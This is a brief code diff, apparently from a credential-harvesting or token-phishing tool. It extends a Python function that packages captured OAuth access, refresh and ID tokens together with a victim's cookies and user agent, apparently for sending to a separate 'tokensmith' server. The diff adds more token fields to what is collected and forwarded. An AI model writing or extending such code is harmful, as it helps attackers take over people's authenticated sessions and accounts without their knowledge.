@@ -376,6 +376,9 @@ def push_to_tokensmith(token_data, tokensmith_url, original_payload=None):
     payload = json.dumps({
         'access_token': token_data.get('access_token'),
         'refresh_token': token_data.get('refresh_token'),
+        'scope': token_data.get('scope', ''),
+        'expires_in': token_data.get('expires_in', 0),
+        'id_token': token_data.get('id_token', ''),
         'cookies': original_payload.get('cookies', []),
         'user_agent': original_payload.get('user_agent', ''),
     }).encode('utf-8')
